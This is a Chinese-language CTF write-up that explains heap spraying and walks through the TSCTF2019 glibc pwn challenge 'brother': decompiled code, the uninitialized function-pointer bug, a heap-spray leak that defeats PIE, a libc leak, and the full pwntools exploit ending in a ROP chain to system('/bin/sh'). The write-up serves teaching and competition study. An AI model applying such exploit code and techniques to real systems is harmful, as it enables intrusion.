# 堆喷在glibc pwn中的应用

## 前言

据笔者观察，在CTF比赛中许多glibc pwn题难以结合实际漏洞对选手进行考察，web类的题目和CVE结合的更紧密一点。个人认为CTF作为信息安全爱好者入门的一个途径应该更加偏向实战中的技巧对选手的技能进行考察。近些年的Real World模式，有`qemu逃逸`、`docker逃逸`、`VMware逃逸`、`浏览器沙箱逃逸`、`IOT设备破解`等新型题目，和实际漏洞更加贴近。`kernel pwn`题目也让二进制选手把目光放在更底层的操作系统部分。

## 堆喷介绍

### 基本概念

堆喷并没有一个官方的定义，我们根据这种攻击技术的特点总结一下。堆喷是在`shellcode`之前加上大量的`slide code(滑板指令)`，组成一个注入代码段。之后多次申请内存(一般是`堆等动态内存`)，用注入代码段反复填充，之后结合其他攻击技术来控制程序执行流，使其跳转到堆上执行，最终得以执行`shellcode`。

堆喷不同于`UAF`，UAF一般都有明确的可以重用的内存区域，不需要"喷射"多个对象内存，通常只需要将目标对象放到之前已经释放/易受攻击的内存空间中即可。
### 攻击原理

注入代码段的组成为`滑板指令+shellcode`，其中后者只需编写对应系统/架构/软件的恶意代码。以`32位windows`为例，前者一般使用`0x0c0c0c0c`。根据微软官网对于虚拟内存分配的介绍可以得知每个用户模式进程都有其各自的专用虚拟地址空间，但在内核模式下运行的所有代码都共享称为`系统空间`的单个虚拟地址空间。用户模式进程的虚拟地址空间称为`用户空间` 。

> 在 32 位 Windows 中，可用的虚拟地址空间共计为 2^32 字节（4 GB）。 通常，较低的 2 GB 用于用户空间，较高的 2 GB 用于系统空间。

也就是说这里的`0~0x7fffffff`的虚拟地址属于用户空间。

> 其中在`XP sp3`系统上的内存探测发现各种内存数据在内存地址的分布大概为`栈->堆->全局静态变量(从低地址道高地址)`，由此可知堆的起始分配地址是很低的。

> 当申请大量内存，堆很有可能覆盖到的地址是0x0A0A0A0A（160M），0x0C0C0C0C（192M），0x0D0D0D0D（208M）等等几个地址，这也是为什么一般的网马里面进行堆喷时，申请的内存大小一般都是200M的原因，主要是为了保证能覆盖到`0x0C0C0C0C`地址

那么为什么要采取`slide code+shellcode`的组成形式呢，直接都用`shellcode`不好吗？这个问题我们可以举个小例子来看：假如可控内存大小为1kb，一个shellcode长度为16字节，假如我们填满shellcode，即64个shellcode，因每次需要定位到shellcode的头部才能完成执行shellcode的完整过程，我们假设其中有一个函数指针，其位置是随机的，成功执行sc的概率为`64/1024=6.25%`；如果我们采用`1008 bytes slide code+ 16 bytes shellcode`的方式，当执行`slide code`的时候依然可以通过`滑栈`等指令往下执行到shellocde，此时成功执行sc的概率为`(1008+1)/1024=98.5%`，且差距会随着内存空间增大而越发明显，当到了我们实际虚拟内存中，触发成功的概率甚至高达99.9%。

第二个问题是我们为什么要选择`0x0c0c0c0c`这个值而不是`\x90`这种`nop`作为我们的滑板指令呢？这个问题跟我们控制执行流的方式有关，目前我们使用较多的攻击方式是攻击函数的虚表指针(以`c++`编写的软件为多)，虚表就是一个对象，里面存储了许多函数指针，假如我们拿`\x90`作为滑板指令，则这些函数指针都被覆盖成了`0x90909090`，在执行这些函数的时候会跳转到`0x90909090`的内核空间去执行代码，软件crash。而我们采用堆喷的方式让`0x0c0c0c0c`的内容也会0x0c0c0c0c，这种情况下无论是一级函数指针还是二级甚至三级指针，都能最终从`0x0c0c0c0c`这块地址开始执行，最终经过一系列的滑板指令到达shellcode，获取权限。

![2.jpg](https://i.loli.net/2020/02/06/zCU2IdKcmSqrM4a.png)

![1.png](https://i.loli.net/2020/02/06/YwIMAR7cKBVuHzP.png)

## TSCTF2019 薛定谔的堆块

这道题目是TSCTF(天枢CTF)2019的一道题目，当时是零解。出题人为`w1tcher`师傅，据`p4nda`师傅说他和`w1tcher`师傅聊天的时候谈到要出一道非传统的glibc pwn，考验大家对于`堆喷思维`的了解和应用。遗憾的是当时对此知之甚少，现分析`w1tcher`师傅赛后给的wp，帮助大家了解这道涉及到堆喷的glibc pwn。

题目下载链接如下：



### 题目分析

这道题是一道linux glibc pwn，拿checksec查看一下保护机制发现这是一个32位的程序，开启了所有常见保护。

```
*] '/home/wz/Desktop/CTF/tsctf2019/brother/brother'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

主要功能函数为`play`函数，共实现了5个功能，分别为`Create`、`Display`、`Delete`、`Modify`和`CallFuc`

```c
void play()
{
  while ( 1 )
  {
    menu();
    switch ( read_choice() )
    {
      case 1:
        Create();
        break;
      case 2:
        Display();
        break;
      case 3:
        Delete();
        break;
      case 4:
        Modify();
        break;
      case 5:
        CallFuc();
        break;
      case 6:
        puts("Thank you for using");
        exit(0);
        return;
      default:
        puts("Choice error!");
        break;
    }
  }
}

```

Create函数主要是创建新的chunk，每一次Create会调用`0x10`次`malloc(size+4)`，分配一组相同大小的chunk，并且随机地将这些chunk地址及size存放在一个`bss`上一个大区块的16个小区域内。chunk的数量不超过`0x10*0x100`。并且将这`0x10`个节点开始的位置记录在`dword_4008`。

每次在读取完用户输入之后，会根据用户输入的`type`在`chunk[size]`后追加一个四字节的函数指针。

这里的`read_str`函数在读取输入的时候调用参数为`chunk_addr`及`size+1`，函数内部会在输入最后填'\x00'，这样就保证了输出会有`零字符截断`。

```c
unsigned int Create()
{
  unsigned int result; // eax
  int choice; // eax
  unsigned int i; // [esp+8h] [ebp-20h]
  signed int j; // [esp+Ch] [ebp-1Ch]
  signed int l; // [esp+Ch] [ebp-1Ch]
  int k; // [esp+10h] [ebp-18h]
  int size; // [esp+14h] [ebp-14h]
  _DWORD *v7; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i <= 0xFF && dword_4060[32 * i]; ++i )
    ;
  if ( i == 0x100 )
    return puts("Full! you can't apply for more.");
  printf("Please enter the size of note : ");
  size = read_choice();
  if ( size <= 0 || size > 0x20000 )
    return puts("Size error!");
  for ( j = 0; j <= 15; ++j )
  {
    for ( k = rand() % 16; dword_4060[2 * (k + 16 * i)]; k = (k + 1) % 16 )
      ;
    dword_4060[2 * (16 * i + k) + 1] = size;
    dword_4060[2 * (16 * i + k)] = malloc(size + 4);
    if ( !dword_4060[2 * (k + 16 * i)] )
    {
      puts("Malloc error!");
      exit(-1);
    }
  }
  for ( l = 0; l <= 15; ++l )
  {
    printf("input note data : ");
    read_str(dword_4060[2 * (l + 16 * i)], dword_4060[2 * (l + 16 * i) + 1]);
    TypeMenu();
    printf("input the type : ");
    choice = read_choice();
    v7 = (_DWORD *)(dword_4060[2 * (l + 16 * i)] + dword_4060[2 * (l + 16 * i) + 1]);// here
    if ( choice == 2 )
    {
      *v7 = &unk_4014;
    }
    else if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        *v7 = &unk_401C;
      }
      else if ( choice == 4 )
      {
        *v7 = &unk_4024;
      }
    }
    else if ( choice == 1 )
    {
      *v7 = &unk_400C;
    }
  }
  printf("Note creation success! Index is : %d - %d\n", 16 * i, 16 * (i + 1) - 1);
  result = i;
  dword_4008 = i;
  return result;
}

/*
.data:00004010                 dd offset common
.data:00004014 unk_4014        db  10h                 ; DATA XREF: Create+266↑o
.data:00004015                 db  27h ; '
.data:00004016                 db    0
.data:00004017                 db    0
.data:00004018                 dd offset transparent
.data:0000401C unk_401C        db  64h ; d             ; DATA XREF: Create+273↑o
.data:0000401D                 db    0
.data:0000401E                 db    0
.data:0000401F                 db    0
.data:00004020                 dd offset Emmm
.data:00004024 unk_4024        db 0C8h                 ; DATA XREF: Create+280↑o
.data:00004025                 db    0
.data:00004026                 db    0
.data:00004027                 db    0
.data:00004028                 dd offset anoymous
*/

int common()
{
  return puts("I am a common man!");
}

int transparent()
{
  return puts("I am a transparent person!");
}

int Emmm()
{
  return puts("flag is flag{1t_i5_a_5ecr2t}!");
}

int anoymous()
{
  return puts("I am an anonymous person!");
}

unsigned int __cdecl read_str(int str, unsigned int len)
{
  int v2; // eax
  int v3; // eax
  unsigned int result; // eax
  char buf; // [esp+13h] [ebp-15h]
  unsigned int v6; // [esp+14h] [ebp-14h]
  ssize_t v7; // [esp+18h] [ebp-10h]
  unsigned int v8; // [esp+1Ch] [ebp-Ch]

  v8 = __readgsdword(0x14u);
  v6 = 0;
  while ( v6 < len )
  {
    v7 = read(0, &buf, 1u);
    if ( v7 <= 0 )
    {
      puts("Read error!");
      exit(-1);
    }
    if ( buf == '\n' )
    {
      buf = 0;
      v2 = v6++;
      *(_BYTE *)(str + v2) = 0;
      break;
    }
    v3 = v6++;
    *(_BYTE *)(str + v3) = buf;
  }
  *(_BYTE *)(len - 1 + str) = 0;
  result = __readgsdword(0x14u) ^ v8;
  if ( result )
    chunk_faile();
  return result;
}
```

Display函数根据用户输入的`start_index`和`end_index`输出从`notes[start_index]`到`notes[end_index]`(包含此节点)的节点的全部内容。

```c
int Display()
{
  int result; // eax
  unsigned int i; // [esp+4h] [ebp-14h]
  unsigned int start_index; // [esp+8h] [ebp-10h]
  unsigned int end_index; // [esp+Ch] [ebp-Ch]

  printf("Please input start index : ");
  start_index = read_choice();
  printf("Please input end index : ");
  end_index = read_choice();
  if ( start_index > 0xFFF || end_index > 0xFFF )
    return puts("Index error!");
  for ( i = start_index; ; ++i )
  {
    result = i;
    if ( i > end_index )
      break;
    printf("Notes are : %s\n", dword_4060[2 * i]);
  }
  return result;
}
```

Delete函数根据`dword_4008`的值释放`0x10`个堆块并且将对应位置的`notes[idx]`清空。

```c
int Delete()
{
  int i; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  v2 = dword_4008;
  if ( dword_4008 < 0 || (unsigned int)dword_4008 > 0xFF )
    return puts("Delete error!");
  for ( i = 16 * dword_4008; 16 * (v2 + 1) > i; ++i )
  {
    free((void *)dword_4060[2 * i]);
    dword_4060[2 * i] = 0;
  }
  --dword_4008;
  return puts("Delete success!");
}
```

Modify函数对于指定`index`的堆块进行编辑。

```c
int Modify()
{
  unsigned int v1; // ST1C_4
  unsigned int v2; // [esp+8h] [ebp-10h]

  printf("Please input index : ");
  v2 = read_choice();
  if ( v2 > 0xFFF || !dword_4060[2 * v2] )
    return puts("Index error!");
  v1 = strlen((const char *)dword_4060[2 * v2]) + 1;
  printf("Please enter the note : ");
  read_str(dword_4060[2 * v2], v1);
  return puts("Edit success!");
}
```

CallFuc这个函数检查`note[idx]`这个chunk的最后四个字节`v2`，如果`v2`这个地址的值`val`不为0就`--*v2`，指针值自减一；否则调用`*(v2+4)()`

```c
int CallFuc()
{
  int v1; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Please input index : ");
  v1 = read_choice();
  if ( v1 < 0 || (unsigned int)v1 > 0xFFF || !dword_4060[2 * v1] )
    return puts("Index error!");
  v2 = *(_DWORD *)(dword_4060[2 * v1] + dword_4060[2 * v1 + 1]);
  if ( *(_DWORD *)v2 )
    --*(_DWORD *)v2;
  else
    (*(void (**)(void))(v2 + 4))();
  return puts("Call success!");
}
```

### 漏洞利用

这里的漏洞在`Create`函数里，在选择`type`的时候一旦我们没有选择`1-4`，就会直接返回，不再赋值函数指针，这就导致堆上对应的部分可能残存了之前堆块的信息，之后在`CallFuc`中处理的函数指针是可控的。

虽然可以控制这个指针`v2`，但是由于开了`PIE`以及输入`零字符截断`，我们不能通过传统方式泄露堆地址和libc地址，这里用到的就是`堆喷`的思想，我们在gdb中多次调试会发现`heap`的地址总是`0x57*`或者`0x56*`，这意味着如果我们申请足够大的内存空间(如`0x20000000`)，那么堆地址就会变成`0x56*-0x58*`，`0x57*`里是一定有值的，此时我们将`v2`设置为`0x57*`不会出现内容引用错误，那么我们如果事先在这块内存上布置好数据，通过指针引用的减一功能，对其中某块数据减一，最后再输出，就可以判断是在哪块内存做了修改，进而判断这块内存地址(通过这个固定内存地址-输出中特殊字符相对于开始的位置offset)。

这里还有一个问题就是一个大区块中的16个小区块分布是随机的，并不是按照地址递增顺序从前到后依次排布，这就导致我们无法衡量之前计算得到的这块内存地址距离开始分配内存的`heap_start`之间的距离。这里有朋友可能想到根据堆排布用`1/16`的概率爆破，但是这条路已经被出题人想到并堵死了，在`Init`函数里先用堆分配了一块`随机大小`的内存，导致堆的排布并不是完全可控的。

继续思考，虽然一个大区块的0x10个小堆块分布随机，但是由于每个大区块分配的总数是一定的我们可以根据刚才找到的小堆块挨个前推，一直找到大区块的起始位置，这个位置不具有随机性，进而可以推断出`heap_start_addr`。

堆地址泄露之后我们可以将`v2`指向一个分配到`unsorted bin`的`chunk`部分写，用指针减一功能将`\x00`改为`\xff`，进而绕过零字符截断，输出`main_arena`相关地址泄露`libc_base`。


```c
/*
gdb-peda$ vmmap
Start      End        Perm      Name
0x5658e000 0x56591000 r-xp      /home/wz/Desktop/CTF/tsctf2019/brother/brother
0x56591000 0x56592000 r--p      /home/wz/Desktop/CTF/tsctf2019/brother/brother
0x56592000 0x56593000 rw-p      /home/wz/Desktop/CTF/tsctf2019/brother/brother
0x56593000 0x5659b000 rw-p      mapped
0x5811c000 0x5813e000 rw-p      [heap]
0xf7dcc000 0xf7dcd000 rw-p      mapped
0xf7dcd000 0xf7f7d000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xf7f7d000 0xf7f7f000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xf7f7f000 0xf7f80000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
0xf7f80000 0xf7f83000 rw-p      mapped
0xf7fa0000 0xf7fa1000 rw-p      mapped
0xf7fa1000 0xf7fa4000 r--p      [vvar]
0xf7fa4000 0xf7fa6000 r-xp      [vdso]
0xf7fa6000 0xf7fc9000 r-xp      /lib/i386-linux-gnu/ld-2.23.so
0xf7fc9000 0xf7fca000 r--p      /lib/i386-linux-gnu/ld-2.23.so
0xf7fca000 0xf7fcb000 rw-p      /lib/i386-linux-gnu/ld-2.23.so
0xff7dd000 0xff7ff000 rw-p      [stack]
*/
unsigned int Init()
{
  int v0; // eax
  unsigned int result; // eax
  unsigned int buf; // [esp+4h] [ebp-14h]
  int fd; // [esp+8h] [ebp-10h]
  unsigned int v4; // [esp+Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x12Cu);
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4u);
  srand(buf);
  v0 = rand();
  malloc(4 * (v0 % 0x810));
  result = __readgsdword(0x14u) ^ v4;
  if ( result )
    chunk_faile();
  return result;
}

```

现在我们有了libc地址就可以使用libc中的`gadget`了，我们将`v2`改为堆地址`heap_addr`，在满足`*heap_addr == 0`的条件下可以调用`*(v2+4)`上的`gadget`，经过测试发现`one_gadget`使用条件均不满足，需要自己构造`rop`。

观察CallFuc的调用部分，可以看到`.text:0000131D                 mov     ecx, [eax+edx*8]`将堆地址放在了`ecx`寄存器中且后续没有更改寄存器值，我们希望将栈迁移到堆，因此只要想办法将`ecx`的值放进`esp`里即可。

这里寻找了两个特殊的`gadget`，首先执行第一个`gadget`让`eax`和`ecx`寄存器的值互换然后调用`[*heap_addr]`，我们在堆块头部放第二个`gadget`，执行这个`gadget`会让`eax`与`esp`寄存器值互换，pop掉无用数据,`ret`的时候触发`rop chain`

```asm
.text:00001314 loc_1314:                               ; CODE XREF: CallFuc+4A↑j
.text:00001314                 lea     eax, (dword_4060 - 3F98h)[ebx]
.text:0000131A                 mov     edx, [ebp+var_10]
.text:0000131D                 mov     ecx, [eax+edx*8]
.text:00001320                 lea     eax, (dword_4060 - 3F98h)[ebx]
.text:00001326                 mov     edx, [ebp+var_10]
.text:00001329                 mov     eax, [eax+edx*8+4]
.text:0000132D                 add     eax, ecx
.text:0000132F                 mov     eax, [eax]
.text:00001331                 mov     [ebp+var_C], eax
.text:00001334                 mov     eax, [ebp+var_C]
.text:00001337                 mov     eax, [eax]
.text:00001339                 test    eax, eax
.text:0000133B                 jnz     short loc_1347
.text:0000133D                 mov     eax, [ebp+var_C]
.text:00001340                 mov     eax, [eax+4]
.text:00001343                 call    eax
.text:00001345                 jmp     short loc_1354



```

```c
/*
magic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword
ptr [eax]
magic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;
mov esi, eax ; add esp, 0x14 ; mov eax, esi ; pop ebx ; pop esi ; ret
```

### exp.py

这里给的exp是`w1tcher`师傅赛后给的官方exp。较为复杂，建议中间多加断点进行调试，需要注意的几个点：
1. 这里通过先分配n个堆块再释放再申请n个小堆块的方式进行堆风水排布以及`v2`指针的控制

2. 选取的地址为`0x58585858`，第一步通过输出判断`0x58585858`这个地址在我们分配的哪个`notes[idx]`的哪个`offset`处，之后根据这个设定范围，向后搜索离其最近的一个大区块的最后一个区块(这里的`最后`指的是分配的`堆地址的最大`的那一个而不是bss上这个区块里`idx`最大的那个)，最终根据偏移计算出`heap_start_addr(开始分配堆块的起始地址)`

```py
from pwn import *

import string

import os

from hashlib import sha256

context(arch = 'i386', os = 'linux', endian = 'little')

context.log_level = 'info'

context.terminal = ['tmux', 'split', '-h']

'''

def POW():

    context.log_level = 'debug'

    p.recvuntil('sha256(XXXX + ')

    end = p.recvuntil(') == ')[ : -5]

    hs = p.recvline()[ : -1]

    p.recvuntil(' : ')

    s = string.letters+string.digits

    for t1 in s:

        for t2 in s:

            for t3 in s:

                for t4 in s:

                    if sha256(t1 + t2 + t3 + t4 + end).hexdigest() == hs:

                        p.sendline(t1 + t2 + t3 + t4)

                        context.log_level = 'info'

                        return

    exit(0)

'''

def malloc(sz, data):



    p.recvuntil('>>> ')

    p.sendline('1')

    p.recvuntil(': ')

    p.sendline(str(sz))

    for buf, te in data:

        p.recvuntil(': ')

        p.sendline(buf)

        p.recvuntil(': ')

        p.sendline(str(te))

def show(s_idx, e_idx):

    p.recvuntil('>>> ')

    p.sendline('2')

    p.recvuntil(': ')

    p.sendline(str(s_idx))

    p.recvuntil(': ')

    p.sendline(str(e_idx))

def delete():

    p.recvuntil('>>> ')

    p.sendline('3')

def modify(idx, buf):

    p.recvuntil('>>> ')

    p.sendline('4')

    p.recvuntil(': ')

    p.sendline(str(idx))

    p.recvuntil(': ')

    p.sendline(buf)

def callfuc(idx):

    p.recvuntil('>>> ')

    p.sendline('5')

    p.recvuntil(': ')

    p.sendline(str(idx))

def GameStart(ip, port, debug):

    global p

    if debug == 1:

        p = process('./brother')

    elif debug == 2:

        p = process('./brother',env={'LD_PRELOAD':'./libc-2.23.so'})

    else:

        p = remote(ip, port)

    #POW()

    data = []

    for i in range(0x10):

        data.append(['X' * (0x20000 - 1), 1])

    malloc(0x20000, data)

    delete()

    #malloc 0x100 0x20000 chunks

    for i in range(0x10):

        malloc(0x20000, data)

    data = []

    for i in range(0x10):

        data.append(['X' * (0x1000 - 1), 1])

    malloc(0x1000, data)


    delete()


    data = []

    for i in range(0x10):

        data.append(['X' * (0xf0 - 1), 0])

    malloc(0xf0, data)


    #every malloc 0x10 chunk

    #set 0x58585858 = 0x58585857

    callfuc(0x100)

    show(0, 0x100)

    index = 0

    offest = 0

    out = ''

    for i in range(0x100):

        out = p.recvline()

        if 'W' in out:

            index = i

            break

    out = out[12 : ]

    offest = out.index('W')

    log.info('0x58585858 is : %d' % index)

    log.info('offest is : %d' % offest)

    log.info('start addr is : ' + hex(0x58585858 - offest))

    block_start = (index / 0x10) * 0x10

    log.info('block start is : ' + hex(block_start))

    magic_addr = 0x58585858

    #0x100-0x110 free

    delete()

    count = 1

    p_index = 0



    while 1:

        log.info("start find prev block count = %d" % count)

        data = []

        for i in range(0x10):

            data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),

    1])

        malloc(0x1000, data)

        delete()



        data = []

        for i in range(0x10):

            data.append(['X' * (0xa0 - 1), 0])

        malloc(0xa0, data)

        log.info("start call fuc count = %d" % count)


        callfuc(0x100)

        show(block_start - 0x10, index + 1)

        p_index = 0

        out = ''

        for i in range(index + 1 - block_start + 0x10):

            out = p.recvline()

            if 'W' in out:

                out = out[12 : ]

                print "find again! " + str(out.index('W'))

                p_index = i + block_start - 0x10

                break
        delete()

        #find last of th

        if p_index < block_start:

            break

        count += 1

    log.info('block start is : %d' % block_start)

    log.info('p_index is : %d' % p_index)

    heap_start_addr = magic_addr - 0x20008 * (count - 1 +0x10 * (block_start / 0x10)) - offest - 8

    log.info('heap start is : ' + hex(heap_start_addr))

    for i in range(0x10):

        delete()

    data = []

    for i in range(0x10):

        data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])


    malloc(0x1000, data)

    delete()

    data = []

    for i in range(0x10):

        data.append(['aaa', 0])

    malloc(0xa0, data)

    callfuc(0)


    show(0, 0x10)

    for i in range(index + 1 - block_start + 0x10):

        out = p.recvline()

        out = out[12 : -1]

        if 'aaa' != out:

            libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0

            break

    log.info('libc addr is : ' + hex(libc_addr))

    delete()

    magic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword

    magic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;

    system_offest = 0x3a940

    binsh_addr = 0x15902b

    data = []

    for i in range(0x10):

        data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])

    malloc(0x1000, data)

    delete()



    data = []

    for i in range(0x10):

        data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr

    + magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +

    p32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\x00'), 0])

    malloc(0xa0, data)

    gdb.attach(p)

    callfuc(0)

    p.interactive()

GameStart('10.112.100.47', 9999, 2)
```

### 总结

这道题实际上并没有用到标准的堆喷获取控制流的技术，但是在解题过程中应用到了这种`堆喷`的思维来`bypass PIE`。我们通过分配大量内存以及堆风水来达到控制程序反馈信息进而获得地址的目的，这种宏观意义上对于堆分配的利用同传统`glib pwn`上考察几个堆块之间分配释放利用技巧不同，更注重大家对于全局的思考，是一道非常精妙的二进制题目。这里再次感谢`w1tcher`师傅赛后提供的writeup和exp，以及`p4nda`师傅对我的帮助。

## 参考

[演示Heap Spray(堆喷射)的原理](https://blog.csdn.net/lixiangminghate/article/details/53413863)

[Linux内核通用堆喷射技术详解](https://xz.aliyun.com/t/2814)

[Microsoft-virtual-address-spaces](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/virtual-address-spaces)